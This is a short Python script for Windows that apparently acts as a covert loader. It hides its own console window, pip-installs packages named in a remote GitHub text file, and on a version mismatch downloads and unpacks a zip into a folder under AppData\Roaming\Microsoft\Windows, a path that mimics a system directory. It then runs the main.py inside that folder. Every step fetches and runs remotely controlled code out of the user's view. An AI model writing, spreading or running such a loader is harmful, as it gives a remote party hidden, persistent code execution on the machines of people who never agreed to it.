import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

import requests
import zipfile
import os
import shutil
import subprocess
import sys

user_profile = os.environ['USERPROFILE']
def install_packages(package_string):
    packages = package_string.split()
    for package in packages:
        print(f"Installing {package}...")
        subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/new_packages.txt")
p1 = r.text
if not p1 == "":
    install_packages(p1)

with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain', 'ver.txt'), 'r') as ver:
    r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ver.txt")
    ver1 = r.text
    ver2 = ver.read()
    if ver2 == ver1:
        pass
    else:
        shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain'))
        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
        r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
        open(file_path, 'wb').write(r.content)
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(target_path)
        os.remove(file_path)
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
subprocess.Popen(['python', os.path.join(target_path, "skibidi-mainmain", "main.py")])

